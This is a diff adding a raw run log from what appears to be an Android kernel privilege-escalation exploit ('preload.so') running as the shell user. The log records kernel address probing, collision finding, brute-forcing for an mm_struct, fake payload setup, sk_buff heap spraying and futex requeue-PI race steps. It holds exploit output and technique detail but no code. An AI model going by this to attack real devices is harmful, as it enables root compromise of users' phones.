@@ -1,0 +1,98 @@
+===== preload.so crash-safe log =====
+path=/storage/emulated/0/Download/.temp/log_1788951338.txt tmp=/data/local/tmp/.temp/log_1788951338.txt pid=13508 uid=2000
+1788951338.727 13508 [+] preload starting pid=13508
+1788951338.732 13508 [+] startup context pid=13508 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+1788951338.735 13508 [+] build config pid=13508 label=pd2238_os6_163150_w10 slide=pselect main=pselect
+1788951338.737 13508 [+] p0 profile pid=13508 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 init_task=ffffffc00aaec240 root_tg=ffffffc00ad33100
+1788951338.740 13508 [+] direct-map base=ffffff8040000000 slide=0000000000000000
+1788951338.745 13508 [+] ckpt: WRITE-PROOF armed bootid_store=ffffff8042ee9110 bootid_buf=ffffff8042ee910d before=af75bfb7-4a3a-4569-9564-1363a97c27f1 (odd: leaked scratch, even: aligned bootid+3)
+1788951342.301 13508 [*] parameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (16) mte disabled
+1788951346.171 13508 [*] pile-up verified: approx_time=2813
+1788951346.181 13508 [*] start finding collisisons
+1788951346.185 13508 [*] target    0000007dd46110c8
+1788951346.806 13508 [*]   0000006b395e2f10
+1788951347.160 13508 [*]   0000006b39648240
+1788951350.042 13508 [*]   0000006b3abacd60
+1788951350.481 13508 [*]   0000006b3ad399c8
+1788951351.151 13508 [*]   0000006b3b11b8d8
+1788951351.730 13508 [*]   0000006b3b4c8640
+1788951352.246 13508 [*]   0000006b3b759ac8
+1788951353.412 13508 [*]   0000006b3c12e970
+1788951355.235 13508 [*]   0000006b3d124920
+1788951355.722 13508 [*]   0000006b3d524920
+1788951356.447 13508 [*]   0000006b3dc01008
+1788951356.977 13508 [*]   0000006b3e084420
+1788951358.654 13508 [*]   0000006b3f1edf68
+1788951359.653 13508 [*]   0000006b3fb91c88
+1788951360.087 13508 [*]   0000006b3ff60b00
+1788951360.088 13508 [*] found 15 collisisons
+1788951361.871 13508 [*] start bruteforcing
+1788951361.878 13508 [*] [  0] start finding mm_struct [ffffff8000000000-ffffff8800000000]
+1788951361.878 13508 [*] [  1] start finding mm_struct [ffffff8800000000-ffffff9000000000]
+1788951361.878 13508 [*] [  2] start finding mm_struct [ffffff9000000000-ffffff9800000000]
+1788951361.879 13508 [*] [  4] start finding mm_struct [ffffffa000000000-ffffffa800000000]
+1788951361.882 13508 [*] [  3] start finding mm_struct [ffffff9800000000-ffffffa000000000]
+1788951361.879 13508 [*] [  6] start finding mm_struct [ffffffb000000000-ffffffb800000000]
+1788951361.884 13508 [*] [  1] tested 100000 candidates, scanning=0xffffff8805948f00
+1788951361.881 13508 [*] [  0] tested 100000 candidates, scanning=0xffffff8005948f00
+1788951361.879 13508 [*] [  7] start finding mm_struct [ffffffb800000000-ffffffc000000000]
+1788951361.884 13508 [*] [  5] start finding mm_struct [ffffffa800000000-ffffffb000000000]
+1788951361.885 13508 [*] [  4] tested 100000 candidates, scanning=0xffffffa005948f00
+1788951361.886 13508 [*] [  2] tested 100000 candidates, scanning=0xffffff9005948f00
+1788951361.888 13508 [*] [  3] tested 100000 candidates, scanning=0xffffff9805948f00
+1788951361.889 13508 [*] [  6] tested 100000 candidates, scanning=0xffffffb005948f00
+1788951361.890 13508 [*] [  1] tested 200000 candidates, scanning=0xffffff880b2921c0
+1788951361.894 13508 [*] [  4] tested 200000 candidates, scanning=0xffffffa00b2921c0
+1788951361.896 13508 [*] [  1] tested 300000 candidates, scanning=0xffffff8810bdb480
+1788951361.892 13508 [*] [  5] tested 100000 candidates, scanning=0xffffffa805948f00
+1788951361.898 13508 [*] [  6] tested 200000 candidates, scanning=0xffffffb00b2921c0
+1788951361.892 13508 [*] [  0] tested 200000 candidates, scanning=0xffffff800b2921c0
+1788951361.891 13508 [*] [  7] tested 100000 candidates, scanning=0xffffffb805948f00
+1788951361.900 13508 [*] [  1] tested 400000 candidates, scanning=0xffffff8816524740
+1788951361.896 13508 [*] [  3] tested 200000 candidates, scanning=0xffffff980b2921c0
+1788951361.896 13508 [*] [  2] tested 200000 candidates, scanning=0xffffff900b2921c0
+1788951361.901 13508 [*] [  5] tested 200000 candidates, scanning=0xffffffa80b2921c0
+1788951361.899 13508 [*] [  4] tested 300000 candidates, scanning=0xffffffa010bdb480
+1788951361.901 13508 [*] [  0] tested 300000 candidates, scanning=0xffffff8010bdb480
+1788951361.902 13508 [*] [  6] tested 300000 candidates, scanning=0xffffffb010bdb480
+1788951361.905 13508 [*] [  1] tested 500000 candidates, scanning=0xffffff881be6da00
+1788951361.905 13508 [*] [  7] tested 200000 candidates, scanning=0xffffffb80b2921c0
+1788951361.906 13508 [*] [  3] tested 300000 candidates, scanning=0xffffff9810bdb480
+1788951361.913 13508 [*] [  6] tested 400000 candidates, scanning=0xffffffb016524740
+1788951361.908 13508 [*] [  2] tested 300000 candidates, scanning=0xffffff9010bdb480
+1788951361.910 13508 [*] [  4] tested 400000 candidates, scanning=0xffffffa016524740
+1788951361.910 13508 [*] [  0] tested 400000 candidates, scanning=0xffffff8016524740
+1788951361.911 13508 [*] [  5] tested 300000 candidates, scanning=0xffffffa810bdb480
+1788951361.913 13508 [*] [  1] tested 600000 candidates, scanning=0xffffff88217b6cc0
+1788951361.916 13508 [*] [  7] tested 300000 candidates, scanning=0xffffffb810bdb480
+1788951361.923 13508 [*] [  0] tested 500000 candidates, scanning=0xffffff801be6da00
+1788951361.917 13508 [*] [  3] tested 400000 candidates, scanning=0xffffff9816524740
+1788951361.920 13508 [*] [  2] tested 400000 candidates, scanning=0xffffff9016524740
+1788951361.920 13508 [*] [  6] tested 500000 candidates, scanning=0xffffffb01be6da00
+1788951361.921 13508 [*] [  4] tested 500000 candidates, scanning=0xffffffa01be6da00
+1788951361.924 13508 [*] [  5] tested 400000 candidates, scanning=0xffffffa816524740
+1788951361.924 13508 [*] [  1] tested 700000 candidates, scanning=0xffffff88270fff80
+1788951361.927 13508 [*] [  7] tested 400000 candidates, scanning=0xffffffb816524740
+1788951361.928 13508 [*] [  0] thread done, tested 593683 candidates
+1788951361.928 13508 [*] [  3] thread done, tested 456036 candidates
+1788951361.929 13508 [*] [  2] thread done, tested 400000 candidates
+1788951361.929 13508 [*] [  6] thread done, tested 500000 candidates
+1788951361.930 13508 [*] [  4] thread done, tested 500000 candidates
+1788951361.931 13508 [*] [  5] thread done, tested 400000 candidates
+1788951361.932 13508 [*] [  1] thread done, tested 700000 candidates
+1788951361.932 13508 [*] [  7] thread done, tested 400000 candidates
+1788951361.935 13508 [*] prepare_kernel_page leaked_mm=ffffff80212130c0 base=ffffff8021210000 mode=0
+1788951361.938 13508 [*] fake payload mode=0 write_shape=1 lock=ffffff80212104d0 w0=ffffff80212113a0 task=ffffff8021212380 write_parent=ffffff8021212178 write_right=ffffff8021210180 write_left=0000000000000000
+1788951361.943 13508 [*] sk_buff reclaim send 1/4 ret=65536 errno=0
+1788951361.945 13508 [*] sk_buff reclaim send 2/4 ret=65536 errno=0
+1788951361.946 13508 [*] sk_buff reclaim send 3/4 ret=65536 errno=0
+1788951361.948 13508 [*] sk_buff reclaim send 4/4 ret=65536 errno=0
+1788951361.951 13508 [*] done
+1788951365.668 13508 [+] heap_spray: page_base=ffffff8021210000 (leaked mm_struct)
+1788951365.672 13508 [+] ckpt: route enter
+1788951365.674 13508 [+] ckpt: route threads spawned
+1788951365.677 13508 [+] ckpt: route ready waiter_waiting=1 owner_started=1
+1788951365.778 13508 [+] ckpt: route CMP_REQUEUE_PI ret=-1 errno=35
+1788951373.676 13508 [+] ckpt: waiter WAIT_REQUEUE_PI ret=-1 errno=110 tid=20081 sigalrm=0 setprio=0/0
+1788951373.681 13508 [+] ckpt: do_sigret enter page=ffffff8021210000 lock=ffffff80212104d0 fops=ffffff8021210180
+1788951373.683 13508 [+] ckpt: sigframe ready sf=0x7dd2f15db0 reserved=0x7dd2f16000 align16=1
